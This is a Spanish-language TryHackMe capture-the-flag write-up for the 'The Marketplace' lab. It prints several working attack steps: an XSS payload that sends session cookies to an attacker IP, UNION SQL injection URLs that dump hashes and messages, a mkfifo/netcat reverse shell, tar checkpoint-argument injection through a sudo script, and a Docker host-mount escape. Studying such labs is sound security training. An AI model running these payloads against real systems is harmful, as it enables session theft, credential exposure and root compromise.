---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]]
	- [[#Explotación#SQLi|SQLi]]
	- [[#Explotación#SSH|SSH]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Sudo/Reverse Shell|Sudo/Reverse Shell]]
	- [[#Escalada de Privilegios#Docker|Docker]]

---
# The Marketplace

![](Screenshots/7c385ae7e0ef53362b807fffe8b69a47.png)

> En este write-up se documenta la resolución paso a paso de la máquina **The Marketplace** de [TryHackMe](https://tryhackme.com/room/marketplace). El laboratorio combina vulnerabilidades web como **XSS** y **SQL Injection**, reutilización de credenciales y una escalada de privilegios mediante **sudo** mal configurado y **Docker**, permitiendo obtener acceso **root**.

---
## Enumeración
### Ping

`ping -c 1 10.82.174.144`

![](Screenshots/Pasted%20image%2020251231132454.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.82.174.144 -oG allPorts`

![](Screenshots/Pasted%20image%2020251230193032.png)

`nmap -p22,80,32768 -sCV 10.82.174.144 -oN targeted`

![](Screenshots/Pasted%20image%2020251230193116.png)
### HTTP

`http://10.82.183.176/`

![](Screenshots/Pasted%20image%2020251231134757.png)
#### Fuzzing Web

`gobuster dir -u http://10.82.174.144 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251231132541.png)

---
## Explotación
### Cross-Site Scripting (XSS)

Se crea una cuenta.

![](Screenshots/Pasted%20image%2020251231132734.png)

Se inicia sesión con la cuenta creada, en nuestro caso `a`.

![](Screenshots/Pasted%20image%2020251231132808.png)

Se accede a `New listing`.

![](Screenshots/Pasted%20image%2020251231132840.png)

Se comprueba si es vulnerable a ataques *XSS*.

`<script>alert(0)</script>`

Es vulnerable a ataques. Se comprueba que cuando creas una nueva lista, tiene un opción para enviarlo a los administradores.

![](Screenshots/Pasted%20image%2020251231132959.png)

Se podría enviar a los administradores para robar la *cookie de sesión* y así poder acceder.

`<script>document.location='http://192.168.135.64:1234/XSS/index.php?c=' + document.cookie</script>`

Nos ponemos en escucha para recibir la *cookie*.

`nc -nlvp 1234`

Se accede a `http://10.82.183.176/report/5`.

![](Screenshots/Pasted%20image%2020251231133239.png)

Se envía y recibimos la *cookie de sesión*.

![](Screenshots/Pasted%20image%2020251231120821.png)

Se accede al panel de control (`Ctrl + Shif + C/Stprage`) y se cambia la *cookie* nuestra por la robada.

![](Screenshots/Pasted%20image%2020251231133521.png)
### SQLi

Se accede a `Administration Panel` y se encuentra la *flag* de la *web*.

![](Screenshots/Pasted%20image%2020251231133703.png)

`http://10.82.183.176/admin?user=1`

![](Screenshots/Pasted%20image%2020251231110223.png)

`http://10.82.183.176/admin?user=1'`

![](Screenshots/Pasted%20image%2020251231110139.png)

`http://10.82.183.176/admin?user=1 ORDER BY 4-- -`

`http://10.82.183.176/admin?user=1 UNION SELECT 1,2,3,4-- -`

![](Screenshots/Pasted%20image%2020251231133758.png)

`http://10.82.183.176/admin?user=0 UNION SELECT 1,2,3,4-- -`

![](Screenshots/Pasted%20image%2020251231110627.png)

Se observa que las columnas `1` y `2`, podemos ver la respuesta.

`http://10.82.183.176/admin?user=0 UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -`

![](Screenshots/Pasted%20image%2020251231111004.png)

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- -`

![](Screenshots/Pasted%20image%2020251231111128.png)

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace'-- -`

![](Screenshots/Pasted%20image%2020251231112637.png)

Se analiza la tabla `users`.

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='users'-- -`

![](Screenshots/Pasted%20image%2020251231113802.png)

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(id, ":", username, ":", password, ":", isAdministrator, '|'),3,4 FROM marketplace.users-- -`

![](Screenshots/Pasted%20image%2020251231114415.png)

| Id  | Username | Password                                                       | IsAdministrator |
| --- | -------- | -------------------------------------------------------------- | --------------- |
| 1   | system   | `$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW` | 0               |
| 2   | michael  | `$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q` | 1               |
| 3   | jake     | `$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG` | 1               |
| 4   | a        | `$2b$10$NxAXBazE5h6vAs6iV3hyZ.QxP8wohjOepC0bNlRHIcr.NMEpoeEMa` | 0               |

Se analiza la tabla `messages`.

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='messages'-- -`

![](Screenshots/Pasted%20image%2020251231114748.png)

`http://10.82.183.176/admin?user=0 UNION SELECT 1,group_concat(id, ":", user_from, ":", user_to, ":", message_content, ":", is_read, "|"),3,4 FROM marketplace.messages-- -`

![](Screenshots/Pasted%20image%2020251231115204.png)

Tabla de mensajes:

| Id  | User_From | User_To | Message_Content                                                                                                                                                                                         | Is_Read |
| --- | --------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- |
| 1   | 3         |         | Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ                 | 1       |
| 2   | 1         | 4       | hank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!        | 1       |
| 3   | 1         | 4       | Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers. | 0       |

Se observa que el primer mensaje, envía una contraseña.
### SSH

`ssh jake@10.82.183.176`

![](Screenshots/Pasted%20image%2020251231121113.png)

Se encuentra la *flag* de *usuario* en `/home/jake/user.txt`.

---
## Escalada de Privilegios
### Sudo/Reverse Shell

![](Screenshots/Pasted%20image%2020251231123057.png)

```Shell
cd /opt/backups
ls -l
```

![](Screenshots/Pasted%20image%2020251231123135.png)

`cat backup.sh`

![](Screenshots/Pasted%20image%2020251231123236.png)

```Shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_MÁQUINA_ATACANTE] [PUERTO_MÁQUINA_ATACANTE] >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 backup.tar shell.sh
nc -nlvp [PUERTO_MÁQUINA_ATACANTE]
sudo -u michael /opt/backups/backup.sh
```

Se obtiene una *Reverse Shell* con el usuario `michael`, se realiza un tratamiento de la terminal.

```Shell
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
### Docker

`id`

![](Screenshots/Pasted%20image%2020251231131745.png)

`docker run -it -v /:/host/ alpine chroot /h`

![](Screenshots/Pasted%20image%2020251231131812.png)

Se encuentra la *flag* de **root** en `/root/root.txt`.

---

